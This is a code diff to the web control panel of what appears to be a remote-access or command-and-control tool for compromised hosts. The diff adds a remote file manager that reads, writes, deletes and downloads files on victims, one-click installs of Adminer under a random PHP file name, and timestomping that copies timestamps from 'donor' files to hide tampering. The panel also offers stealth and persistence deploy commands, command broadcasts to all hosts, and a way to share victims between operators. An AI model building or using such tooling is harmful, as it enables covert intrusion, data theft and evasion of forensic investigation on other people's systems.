@@ -21,6 +21,11 @@
 ╚██████╔╝██████╔╝ ██║ █████╔╝
  ╚═════╝ ╚═════╝  ╚═╝ ╚════╝</pre>
             </div>
+            <div id="user-panel" class="user-panel" style="display:none">
+                <div id="user-tabs" class="user-tabs"></div>
+                <button onclick="createUser()" class="btn-add-user" title="Add User">+</button>
+                <button onclick="openUserManager()" class="btn-manage-users" title="Manage Users">&#9881;</button>
+            </div>
             <div class="stats-panel">
                 <div class="stat online"><span class="value" id="stat-online">0</span><span class="label">ONLINE</span></div>
                 <div class="stat dead"><span class="value" id="stat-dead">0</span><span class="label">DEAD</span></div>
@@ -29,20 +34,19 @@
         </header>
 
         <div class="deploy-box">
-            <div class="deploy-label">DEPLOY COMMANDS</div>
-            <div class="deploy-row"><span class="deploy-type">Stealth:</span><code id="deploy-stealth" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-stealth')" class="btn-copy">COPY</button></div>
-            <div class="deploy-row"><span class="deploy-type">Persist:</span><code id="deploy-persist" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-persist')" class="btn-copy">COPY</button></div>
-        </div>
-
-        <div class="toolbar">
-            <input type="text" id="broadcast-cmd" placeholder="Broadcast command to all hosts...">
-            <button onclick="broadcast()" class="btn btn-accent">BROADCAST</button>
-            <button onclick="refresh()" class="btn">REFRESH</button>
+            <div class="deploy-label" onclick="toggleDeploy()" style="cursor:pointer">DEPLOY COMMANDS <span id="deploy-arrow">▼</span></div>
+            <div id="deploy-content" style="display:none">
+                <div class="deploy-row" style="margin-bottom:6px"><span class="deploy-type">Stealth:</span><code id="deploy-stealth" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-stealth')" class="btn-copy">COPY</button></div>
+                <div class="deploy-row"><span class="deploy-type">Persist:</span><code id="deploy-persist" class="deploy-cmd">Loading...</code><button onclick="copyCmd('deploy-persist')" class="btn-copy">COPY</button></div>
+            </div>
         </div>
 
         <div class="main">
-            <div class="panel clients-panel">
-                <div class="panel-header">HOSTS</div>
+            <div class="panel clients-panel" id="hosts-panel">
+                <div class="panel-header" onclick="toggleHostsPanel()" style="cursor:pointer">
+                    <span id="hosts-title" style="pointer-events:none">HOSTS</span>
+                    <span id="hosts-toggle" style="float:right;opacity:0.5;pointer-events:none">&lt;</span>
+                </div>
                 <div id="clients" class="clients-list"></div>
             </div>
 
@@ -53,11 +57,59 @@
                         <select id="channel-select" class="channel-select" onchange="switchChannel()"></select>
                         <button onclick="connectClient()" class="btn-sm btn-green" id="btn-connect">CONNECT</button>
                         <button onclick="togglePty()" class="btn-sm" id="btn-pty" style="display:none">PTY MODE</button>
+                        <button onclick="toggleFileManager()" class="btn-sm" id="btn-files" style="display:none">FILES</button>
                         <button onclick="destroyClient()" class="btn-sm btn-danger">DESTROY</button>
                     </div>
                 </div>
                 <div id="term-output" class="term-output"></div>
                 <div id="xterm-container" class="xterm-container" style="display:none"></div>
+                
+                <div id="file-manager" class="file-manager" style="display:none">
+                    <div class="fm-toolbar">
+                        <div class="fm-path-bar">
+                            <button onclick="fmGoUp()" class="fm-btn" title="Go Up"><span class="fm-icon">↑</span></button>
+                            <button onclick="fmGoHome()" class="fm-btn" title="Home"><span class="fm-icon">⌂</span></button>
+                            <input type="text" id="fm-path" class="fm-path-input" value="/" onkeypress="if(event.key==='Enter')fmNavigate(this.value)">
+                            <button onclick="fmRefresh()" class="fm-btn" title="Refresh"><span class="fm-icon">↻</span></button>
+                        </div>
+                        <div class="fm-actions">
+                            <button onclick="fmNewFile()" class="fm-btn" title="New File">+ File</button>
+                            <button onclick="fmNewFolder()" class="fm-btn" title="New Folder">+ Folder</button>
+                            <button onclick="fmUpload()" class="fm-btn" title="Upload">Upload</button>
+                            <button onclick="fmAdminer()" class="fm-btn" title="Install Adminer in current dir">Adminer</button>
+                            <button onclick="fmPaste()" class="fm-btn" id="fm-paste-btn" style="display:none" title="Paste">Paste</button>
+                            <input type="file" id="fm-upload-input" style="display:none" onchange="fmDoUpload(this.files)" multiple>
+                        </div>
+                    </div>
+                    <div class="fm-content">
+                        <table class="fm-table">
+                            <thead>
+                                <tr>
+                                    <th class="fm-col-check"><input type="checkbox" id="fm-select-all" onchange="fmSelectAll(this.checked)"></th>
+                                    <th class="fm-col-name" onclick="fmSort('name')">Name</th>
+                                    <th class="fm-col-size" onclick="fmSort('size')">Size</th>
+                                    <th class="fm-col-perms">Perms</th>
+                                    <th class="fm-col-owner">Owner</th>
+                                    <th class="fm-col-date" onclick="fmSort('mtime')">Modified</th>
+                                    <th class="fm-col-actions">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="fm-files"></tbody>
+                        </table>
+                    </div>
+                    <div class="fm-footer">
+                        <div class="fm-status" id="fm-status">Ready</div>
+                        <div class="fm-bulk-actions" id="fm-bulk-actions" style="display:none">
+                            <span id="fm-selected-count">0 selected</span>
+                            <button onclick="fmBulkDownload()" class="fm-btn fm-btn-sm" title="Download selected">⬇ Download</button>
+                            <button onclick="fmBulkTouch()" class="fm-btn fm-btn-sm" title="Touch selected">👆 Touch</button>
+                            <button onclick="fmBulkArchive()" class="fm-btn fm-btn-sm" title="Archive selected">📦 Archive</button>
+                            <button onclick="fmBulkDelete()" class="fm-btn fm-btn-sm fm-btn-danger" title="Delete selected">🗑 Delete</button>
+                        </div>
+                    </div>
+                </div>
+                
+                
                 <div class="term-input-row" id="term-input-row">
                     <span class="prompt">$</span>
                     <input type="text" id="term-input" placeholder="command..." disabled>
@@ -66,8 +118,197 @@
         </div>
     </div>
 
+<div id="fm-editor-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content fm-editor-modal">
+        <div class="fm-modal-header">
+            <span id="fm-editor-title">Edit File</span>
+            <span id="fm-editor-mtime" class="fm-editor-mtime"></span>
+            <button onclick="fmCloseEditor()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <textarea id="fm-editor-content" class="fm-editor-textarea"></textarea>
+        </div>
+        <div class="fm-modal-footer">
+            <div class="fm-editor-ts-options">
+                <label><input type="radio" name="editor-ts-mode" value="update" checked> Update timestamp</label>
+                <label><input type="radio" name="editor-ts-mode" value="preserve"> Preserve original</label>
+                <label><input type="radio" name="editor-ts-mode" value="donor"> Copy from:</label>
+                <select id="fm-editor-donor" class="fm-input-sm"></select>
+            </div>
+            <div class="fm-editor-buttons">
+                <button onclick="fmSaveFile()" class="fm-btn fm-btn-primary">Save</button>
+                <button onclick="fmCloseEditor()" class="fm-btn">Cancel</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="fm-chmod-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content">
+        <div class="fm-modal-header">
+            <span>Change Permissions</span>
+            <button onclick="fmCloseChmod()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <div class="fm-chmod-grid">
+                <div class="fm-chmod-col">
+                    <label>Owner</label>
+                    <label><input type="checkbox" id="chmod-ur" value="4"> Read</label>
+                    <label><input type="checkbox" id="chmod-uw" value="2"> Write</label>
+                    <label><input type="checkbox" id="chmod-ux" value="1"> Execute</label>
+                </div>
+                <div class="fm-chmod-col">
+                    <label>Group</label>
+                    <label><input type="checkbox" id="chmod-gr" value="4"> Read</label>
+                    <label><input type="checkbox" id="chmod-gw" value="2"> Write</label>
+                    <label><input type="checkbox" id="chmod-gx" value="1"> Execute</label>
+                </div>
+                <div class="fm-chmod-col">
+                    <label>Other</label>
+                    <label><input type="checkbox" id="chmod-or" value="4"> Read</label>
+                    <label><input type="checkbox" id="chmod-ow" value="2"> Write</label>
+                    <label><input type="checkbox" id="chmod-ox" value="1"> Execute</label>
+                </div>
+            </div>
+            <div class="fm-chmod-numeric">
+                <label>Numeric: </label>
+                <input type="text" id="chmod-numeric" value="644" maxlength="4" onchange="fmUpdateChmodCheckboxes()">
+            </div>
+        </div>
+        <div class="fm-modal-footer">
+            <button onclick="fmApplyChmod()" class="fm-btn fm-btn-primary">Apply</button>
+            <button onclick="fmCloseChmod()" class="fm-btn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="fm-rename-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content">
+        <div class="fm-modal-header">
+            <span>Rename</span>
+            <button onclick="fmCloseRename()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <input type="text" id="fm-rename-input" class="fm-input" placeholder="New name">
+        </div>
+        <div class="fm-modal-footer">
+            <button onclick="fmDoRename()" class="fm-btn fm-btn-primary">Rename</button>
+            <button onclick="fmCloseRename()" class="fm-btn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="fm-touch-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content">
+        <div class="fm-modal-header">
+            <span>Touch - Set Timestamp</span>
+            <button onclick="fmCloseTouch()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <div class="fm-touch-target">
+                <label>Target file:</label>
+                <span id="fm-touch-target-name"></span>
+            </div>
+            <div class="fm-touch-options">
+                <label><input type="radio" name="touch-mode" value="now" checked onchange="fmTouchModeChange()"> Set to current time</label>
+                <label><input type="radio" name="touch-mode" value="donor" onchange="fmTouchModeChange()"> Copy timestamp from donor file</label>
+            </div>
+            <div id="fm-touch-donor-section" style="display:none">
+                <label>Select donor file:</label>
+                <select id="fm-touch-donor" class="fm-input">
+                    <option value="">-- Select file --</option>
+                </select>
+                <div class="fm-touch-hint">Or enter path manually:</div>
+                <input type="text" id="fm-touch-donor-path" class="fm-input" placeholder="/path/to/donor/file">
+            </div>
+        </div>
+        <div class="fm-modal-footer">
+            <button onclick="fmApplyTouch()" class="fm-btn fm-btn-primary">Apply</button>
+            <button onclick="fmCloseTouch()" class="fm-btn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="fm-create-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content">
+        <div class="fm-modal-header">
+            <span id="fm-create-title">Create New</span>
+            <button onclick="fmCloseCreate()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <div class="fm-form-row">
+                <label>Name:</label>
+                <input type="text" id="fm-create-name" class="fm-input" placeholder="filename.txt">
+            </div>
+            <div class="fm-form-row">
+                <label>Timestamp:</label>
+                <div class="fm-touch-options">
+                    <label><input type="radio" name="create-ts-mode" value="now" checked onchange="fmCreateTsModeChange()"> Current time</label>
+                    <label><input type="radio" name="create-ts-mode" value="donor" onchange="fmCreateTsModeChange()"> Copy from donor</label>
+                </div>
+            </div>
+            <div id="fm-create-donor-section" style="display:none">
+                <select id="fm-create-donor" class="fm-input">
+                    <option value="">-- Select file/folder --</option>
+                </select>
+            </div>
+        </div>
+        <div class="fm-modal-footer">
+            <button onclick="fmDoCreate()" class="fm-btn fm-btn-primary">Create</button>
+            <button onclick="fmCloseCreate()" class="fm-btn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="fm-upload-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content">
+        <div class="fm-modal-header">
+            <span>Upload Files</span>
+            <button onclick="fmCloseUpload()" class="fm-modal-close">×</button>
+        </div>
+        <div class="fm-modal-body">
+            <div class="fm-form-row">
+                <label>Files: <span id="fm-upload-count">0 selected</span></label>
+            </div>
+            <div class="fm-form-row">
+                <label>Timestamp:</label>
+                <div class="fm-touch-options">
+                    <label><input type="radio" name="upload-ts-mode" value="now" checked onchange="fmUploadTsModeChange()"> Current time</label>
+                    <label><input type="radio" name="upload-ts-mode" value="donor" onchange="fmUploadTsModeChange()"> Copy from donor</label>
+                </div>
+            </div>
+            <div id="fm-upload-donor-section" style="display:none">
+                <select id="fm-upload-donor" class="fm-input">
+                    <option value="">-- Select file/folder --</option>
+                </select>
+            </div>
+        </div>
+        <div class="fm-modal-footer">
+            <button onclick="fmDoUploadWithTs()" class="fm-btn fm-btn-primary">Upload</button>
+            <button onclick="fmCloseUpload()" class="fm-btn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="user-manager-modal" class="fm-modal" style="display:none">
+    <div class="fm-modal-content" style="width:500px">
+        <div class="fm-modal-header">
+            <span>User Management</span>
+            <button onclick="closeUserManager()" class="fm-close">&times;</button>
+        </div>
+        <div class="fm-modal-body" id="user-manager-body" style="max-height:400px;overflow-y:auto">
+        </div>
+    </div>
+</div>
+
 <script>
 let selectedHost=null,selectedChannel=null,selected=null,selectedClient=null,sse=null,socket=null,term=null,fitAddon=null,ptyMode=false,ptySessionId=null,hostsData=[];
+let fmMode=false,fmCurrentPath='/',fmFiles=[],fmSelectedFiles=[],fmEditingFile=null,fmChmodFile=null,fmRenameFile=null,fmTouchFile=null,fmClipboard=null,fmClipboardOp=null;
+let fmCreateType=null,fmUploadFiles=null;
+let isAdmin=false,currentUserId=null,usersData=[],viewingUser=null;
+
+// Load saved user from localStorage
+currentUserId=localStorage.getItem('view_as_user')||null;
 
 socket=io();
 socket.on('connect',()=>console.log('WebSocket connected'));
@@ -78,8 +319,28 @@ socket.on('pty_closed',d=>{if(d.session_id===ptySessionId){closePty();term.write
 socket.on('error',d=>alert(d.message));
 
 async function refresh(){
-    const[hosts,stats]=await Promise.all([fetch('/api/clients').then(r=>r.json()),fetch('/api/stats').then(r=>r.json())]);
+    const opts={credentials:'same-origin'};
+    const userParam=currentUserId?`?view_as=${currentUserId}`:'';
+    const[hosts,stats,sessionData]=await Promise.all([
+        fetch('/api/clients'+userParam,opts).then(r=>r.json()),
+        fetch('/api/stats',opts).then(r=>r.json()),
+        fetch('/api/session',opts).then(r=>r.json())
+    ]);
     hostsData=hosts;
+    isAdmin=sessionData.is_admin;
+    viewingUser=sessionData.viewing_user;
+    
+    // Load users if admin
+    if(isAdmin){
+        document.getElementById('user-panel').style.display='flex';
+        try{
+            usersData=await fetch('/api/users',opts).then(r=>r.json());
+            updateUserTabs();
+        }catch(e){}
+    }else{
+        document.getElementById('user-panel').style.display='none';
+    }
+    
     document.getElementById('stat-online').textContent=stats.online;
     document.getElementById('stat-dead').textContent=stats.dead||0;
     document.getElementById('stat-total').textContent=stats.total;
@@ -102,6 +363,13 @@ async function refresh(){
             return `<span class="channel-pill ${ch} ${chStatus}">${ch.toUpperCase()}</span>`;
         }).join('');
         
+        // Show shared users for admin
+        let sharesHtml='';
+        if(isAdmin&&h.shared_with&&h.shared_with.length>0){
+            const names=h.shared_with.map(u=>u.name).join(', ');
+            sharesHtml=`<div class="shared-with"><span class="lbl">Shared:</span> ${names}</div>`;
+        }
+        
         el.innerHTML=`
             <div class="client-row">
                 <span class="status-dot ${statusClass}"></span>
@@ -113,6 +381,7 @@ async function refresh(){
                 <div><span class="lbl">OS:</span> ${h.os}</div>
                 <div><span class="lbl">User:</span> ${h.user}</div>
                 <div><span class="lbl">Last seen:</span> ${h.last_seen_ago}</div>
+                ${sharesHtml}
             </div>`;
         list.appendChild(el);
     });
@@ -189,8 +458,847 @@ function updateControls(){
     
     document.getElementById('btn-connect').style.display=c.online?'none':'inline-block';
     document.getElementById('btn-pty').style.display=(c.online&&c.pty_support)?'inline-block':'none';
+    document.getElementById('btn-files').style.display=c.online?'inline-block':'none';
     document.getElementById('term-input').disabled=!c.online;
 }
+
+function toggleFileManager(){
+    if(!selectedClient||!selectedClient.online)return;
+    if(fmMode){closeFileManager();}
+    else{openFileManager();}
+}
+
+function hideAllModes(){
+    document.getElementById('term-output').style.display='none';
+    document.getElementById('term-input-row').style.display='none';
+    document.getElementById('xterm-container').style.display='none';
+    document.getElementById('file-manager').style.display='none';
+}
+
+function showTerminalMode(){
+    hideAllModes();
+    document.getElementById('term-output').style.display='block';
+    document.getElementById('term-input-row').style.display='flex';
+    document.getElementById('btn-files').textContent='FILES';
+    document.getElementById('btn-files').classList.remove('btn-green');
+    document.getElementById('btn-pty').textContent='PTY MODE';
+    document.getElementById('btn-pty').classList.remove('btn-green');
+    if(selectedClient&&selectedClient.pty_support){
+        document.getElementById('btn-pty').style.display='inline-block';
+    }
+}
+
+async function openFileManager(){
+    if(ptyMode){
+        if(ptySessionId){socket.emit('pty_close',{session_id:ptySessionId});ptySessionId=null;}
+        ptyMode=false;
+        document.getElementById('btn-pty').textContent='PTY MODE';
+        document.getElementById('btn-pty').classList.remove('btn-green');
+    }
+    fmMode=true;
+    hideAllModes();
+    document.getElementById('file-manager').style.display='flex';
+    document.getElementById('btn-files').textContent='TERMINAL';
+    document.getElementById('btn-files').classList.add('btn-green');
+    
+    // Load saved path or default to /
+    let startPath='/';
+    try{
+        const r=await fetch(`/api/clients/${selected}/state`);
+        if(r.ok){
+            const state=await r.json();
+            if(state.fm_path)startPath=state.fm_path;
+        }
+    }catch(e){}
+    await fmNavigate(startPath);
+}
+
+function closeFileManager(){
+    fmMode=false;
+    showTerminalMode();
+}
+
+async function fmAdminer(){
+    if(!selected||!fmCurrentPath)return;
+    const filename=Math.random().toString(36).slice(2,8)+'.php';
+    const fullPath=fmCurrentPath.replace(/\/$/,'')+'/'+filename;
+    fmStatus('Installing Adminer to '+filename+'...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/adminer/install`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:fullPath,timestomp:true})
+        });
+        if(!r.ok){fmStatus('Server error: '+r.status,true);return;}
+        const data=await r.json();
+        if(data.error){fmStatus(data.error,true);return;}
+        fmStatus('Adminer installed!');
+        fmRefresh();
+        if(data.url){
+            window.open(data.url,'_blank');
+        }else{
+            fmStatus('Installed but URL not available - check path',true);
+        }
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmStatus(msg,isError=false){
+    const el=document.getElementById('fm-status');
+    el.textContent=msg;
+    el.style.color=isError?'var(--red)':'var(--fg2)';
+}
+
+async function fmNavigate(path){
+    if(!selected)return;
+    fmStatus('Loading...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/list`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmCurrentPath=data.path||path;
+        fmFiles=data.files||[];
+        document.getElementById('fm-path').value=fmCurrentPath;
+        fmRender();
+        fmStatus(`${fmFiles.length} items`);
+        // Save path to server
+        fetch(`/api/clients/${selected}/state`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fm_path:fmCurrentPath})}).catch(()=>{});
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmRender(){
+    const tbody=document.getElementById('fm-files');
+    tbody.innerHTML='';
+    
+    fmFiles.sort((a,b)=>{
+        if(a.is_dir&&!b.is_dir)return -1;
+        if(!a.is_dir&&b.is_dir)return 1;
+        return a.name.localeCompare(b.name);
+    });
+    
+    fmFiles.forEach((f,i)=>{
+        const tr=document.createElement('tr');
+        tr.className=f.is_dir?'fm-dir':'fm-file';
+        const isArchive=f.name.endsWith('.zip')||f.name.endsWith('.tar.gz')||f.name.endsWith('.tgz');
+        tr.innerHTML=`
+            <td><input type="checkbox" class="fm-checkbox" data-idx="${i}" onchange="fmToggleSelect(${i},this.checked)"></td>
+            <td class="fm-name" onclick="fmClick('${esc(f.name)}',${f.is_dir})" ondblclick="fmDblClick('${esc(f.name)}',${f.is_dir})">
+                <span class="fm-icon">${f.is_dir?'📁':'📄'}</span>
+                <span class="fm-filename">${esc(f.name)}</span>
+            </td>
+            <td class="fm-size">${f.is_dir?'-':fmFormatSize(f.size)}</td>
+            <td class="fm-perms">${f.perms||'-'}</td>
+            <td class="fm-owner">${f.owner||'-'}</td>
+            <td class="fm-date">${f.mtime||'-'}</td>
+            <td class="fm-actions-cell">
+                <div class="fm-actions-wrap">
+                    <button class="fm-actions-trigger" title="Actions">⋮</button>
+                    <div class="fm-actions-menu">
+                        ${!f.is_dir?`<button onclick="fmEdit('${esc(f.name)}')" class="fm-act" title="Edit">✎</button>`:''}
+                        <button onclick="fmRenamePrompt('${esc(f.name)}')" class="fm-act" title="Rename">✏</button>
+                        <button onclick="fmChmodPrompt('${esc(f.name)}','${f.perms||'644'}')" class="fm-act" title="Chmod">🔑</button>
+                        <button onclick="fmCopy('${esc(f.name)}')" class="fm-act" title="Copy">📋</button>
+                        <button onclick="fmTouchPrompt('${esc(f.name)}')" class="fm-act" title="Touch">👆</button>
+                        ${f.is_dir?`<button onclick="fmArchive('${esc(f.name)}')" class="fm-act" title="Zip">📦</button>`:''}
+                        ${isArchive?`<button onclick="fmExtract('${esc(f.name)}')" class="fm-act" title="Extract">📂</button>`:''}
+                        ${!f.is_dir?`<button onclick="fmDownload('${esc(f.name)}')" class="fm-act" title="Download">⬇</button>`:''}
+                        <button onclick="fmDelete('${esc(f.name)}')" class="fm-act fm-act-danger" title="Delete">🗑</button>
+                    </div>
+                </div>
+            </td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+function fmFormatSize(bytes){
+    if(bytes===null||bytes===undefined||bytes<0)return '-';
+    if(bytes===0)return '0 B';
+    const units=['B','KB','MB','GB'];
+    let i=0;
+    while(bytes>=1024&&i<units.length-1){bytes/=1024;i++;}
+    return bytes.toFixed(i>0?1:0)+' '+units[i];
+}
+
+function fmClick(name,isDir){
+    if(isDir){
+        const newPath=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+        fmNavigate(newPath);
+    }else{
+        fmEdit(name);
+    }
+}
+
+function fmDblClick(name,isDir){
+    if(!isDir)fmEdit(name);
+}
+
+function fmGoUp(){
+    if(fmCurrentPath==='/'||fmCurrentPath==='')return;
+    const parts=fmCurrentPath.split('/').filter(p=>p);
+    parts.pop();
+    const parent='/'+parts.join('/');
+    fmNavigate(parent||'/');
+}
+
+function fmGoHome(){
+    fmNavigate('/');
+}
+
+function fmRefresh(){
+    fmNavigate(fmCurrentPath);
+}
+
+async function fmEdit(name){
+    if(!selected)return;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    const fileData=fmFiles.find(f=>f.name===name);
+    const maxSize=1024*1024;
+    if(fileData&&fileData.size>maxSize){
+        const choice=confirm(`File is ${fmFormatSize(fileData.size)} - may be slow.\n\nOK = Open anyway\nCancel = Download instead`);
+        if(!choice){
+            fmDownload(name);
+            return;
+        }
+    }
+    fmStatus('Loading file...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/read`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmEditingFile=path;
+        document.getElementById('fm-editor-title').textContent='Edit: '+name;
+        document.getElementById('fm-editor-mtime').textContent=fileData&&fileData.mtime?'Modified: '+fileData.mtime:'';
+        document.getElementById('fm-editor-content').value=data.content||'';
+        document.querySelector('input[name="editor-ts-mode"][value="update"]').checked=true;
+        const donorSel=document.getElementById('fm-editor-donor');
+        donorSel.innerHTML='';
+        fmFiles.forEach(f=>{
+            const opt=document.createElement('option');
+            opt.value=fmCurrentPath.endsWith('/')?fmCurrentPath+f.name:fmCurrentPath+'/'+f.name;
+            opt.textContent=(f.is_dir?'📁 ':'📄 ')+f.name+' ('+f.mtime+')';
+            donorSel.appendChild(opt);
+        });
+        document.getElementById('fm-editor-modal').style.display='flex';
+        fmStatus('Editing: '+name);
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+async function fmSaveFile(){
+    if(!selected||!fmEditingFile)return;
+    const content=document.getElementById('fm-editor-content').value;
+    const tsMode=document.querySelector('input[name="editor-ts-mode"]:checked').value;
+    fmStatus('Saving...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/write`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:fmEditingFile,content:content})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        if(tsMode==='preserve'){
+            await fetch(`/api/clients/${selected}/files/touch`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({path:fmEditingFile,donor:fmEditingFile})
+            });
+        }else if(tsMode==='donor'){
+            const donor=document.getElementById('fm-editor-donor').value;
+            if(donor){
+                await fetch(`/api/clients/${selected}/files/touch`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({path:fmEditingFile,donor:donor})
+                });
+            }
+        }
+        fmCloseEditor();
+        fmStatus('Saved successfully');
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmCloseEditor(){
+    fmEditingFile=null;
+    document.getElementById('fm-editor-modal').style.display='none';
+}
+
+async function fmDelete(name){
+    if(!confirm(`Delete "${name}"?`))return;
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    fmStatus('Deleting...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/delete`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({path:path})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmStatus('Deleted: '+name);
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmNewFile(){
+    fmCreateType='file';
+    document.getElementById('fm-create-title').textContent='Create New File';
+    document.getElementById('fm-create-name').value='';
+    document.getElementById('fm-create-name').placeholder='filename.txt';
+    document.querySelector('input[name="create-ts-mode"][value="now"]').checked=true;
+    document.getElementById('fm-create-donor-section').style.display='none';
+    fmPopulateDonorSelect('fm-create-donor');
+    document.getElementById('fm-create-modal').style.display='flex';
+}
+
+function fmNewFolder(){
+    fmCreateType='folder';
+    document.getElementById('fm-create-title').textContent='Create New Folder';
+    document.getElementById('fm-create-name').value='';
+    document.getElementById('fm-create-name').placeholder='foldername';
+    document.querySelector('input[name="create-ts-mode"][value="now"]').checked=true;
+    document.getElementById('fm-create-donor-section').style.display='none';
+    fmPopulateDonorSelect('fm-create-donor');
+    document.getElementById('fm-create-modal').style.display='flex';
+}
+
+function fmCloseCreate(){
+    fmCreateType=null;
+    document.getElementById('fm-create-modal').style.display='none';
+}
+
+function fmCreateTsModeChange(){
+    const mode=document.querySelector('input[name="create-ts-mode"]:checked').value;
+    document.getElementById('fm-create-donor-section').style.display=mode==='donor'?'block':'none';
+}
+
+function fmPopulateDonorSelect(selectId){
+    const select=document.getElementById(selectId);
+    select.innerHTML='<option value="">-- Select file/folder --</option>';
+    fmFiles.forEach(f=>{
+        const opt=document.createElement('option');
+        opt.value=fmCurrentPath.endsWith('/')?fmCurrentPath+f.name:fmCurrentPath+'/'+f.name;
+        opt.textContent=(f.is_dir?'📁 ':'📄 ')+f.name+' ('+f.mtime+')';
+        select.appendChild(opt);
+    });
+}
+
+async function fmDoCreate(){
+    const name=document.getElementById('fm-create-name').value.trim();
+    if(!name){alert('Please enter a name');return;}
+    
+    const path=fmCurrentPath.endsWith('/')?fmCurrentPath+name:fmCurrentPath+'/'+name;
+    const tsMode=document.querySelector('input[name="create-ts-mode"]:checked').value;
+    const donor=tsMode==='donor'?document.getElementById('fm-create-donor').value:'';
+    
+    fmStatus('Creating '+(fmCreateType==='folder'?'folder':'file')+'...');
+    try{
+        const endpoint=fmCreateType==='folder'?'mkdir':'write';
+        const body=fmCreateType==='folder'?{path:path}:{path:path,content:''};
+        
+        const r=await fetch(`/api/clients/${selected}/files/${endpoint}`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify(body)
+        });
+        const data=await r.json();
+        if(data.error){fmStatus(data.error,true);return;}
+        
+        if(donor){
+            await fetch(`/api/clients/${selected}/files/touch`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({path:path,donor:donor})
+            });
+        }
+        
+        fmCloseCreate();
+        fmStatus('Created: '+name);
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmRenamePrompt(name){
+    fmRenameFile=name;
+    document.getElementById('fm-rename-input').value=name;
+    document.getElementById('fm-rename-modal').style.display='flex';
+}
+
+function fmCloseRename(){
+    fmRenameFile=null;
+    document.getElementById('fm-rename-modal').style.display='none';
+}
+
+async function fmDoRename(){
+    if(!fmRenameFile)return;
+    const newName=document.getElementById('fm-rename-input').value;
+    if(!newName||newName===fmRenameFile){fmCloseRename();return;}
+    
+    const oldPath=fmCurrentPath.endsWith('/')?fmCurrentPath+fmRenameFile:fmCurrentPath+'/'+fmRenameFile;
+    const newPath=fmCurrentPath.endsWith('/')?fmCurrentPath+newName:fmCurrentPath+'/'+newName;
+    
+    fmStatus('Renaming...');
+    try{
+        const r=await fetch(`/api/clients/${selected}/files/rename`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({old_path:oldPath,new_path:newPath})
+        });
+        const data=await r.json();
+        if(data.error){
+            fmStatus(data.error,true);
+            return;
+        }
+        fmCloseRename();
+        fmStatus('Renamed: '+fmRenameFile+' -> '+newName);
+        fmRefresh();
+    }catch(e){
+        fmStatus('Error: '+e.message,true);
+    }
+}
+
+function fmChmodPrompt(name,perms){
+    fmChmodFile=name;
+    let numeric=perms.replace(/[^0-7]/g,'');
+    if(numeric.length<3)numeric='644';
+    document.getElementById('chmod-numeric').value=numeric;
+    fmUpdateChmodCheckboxes();
+    document.getElementById('fm-chmod-modal').style.display='flex';
+}
+
+function fmCloseChmod(){
+    fmChmodFile=null;
+    document.getElementById('fm-chmod-modal').style.display='none';
+}
+
+function fmUpdateChmodCheckboxes(){
+    const numeric=document.getElementById('chmod-numeric').value.padStart(3,'0');
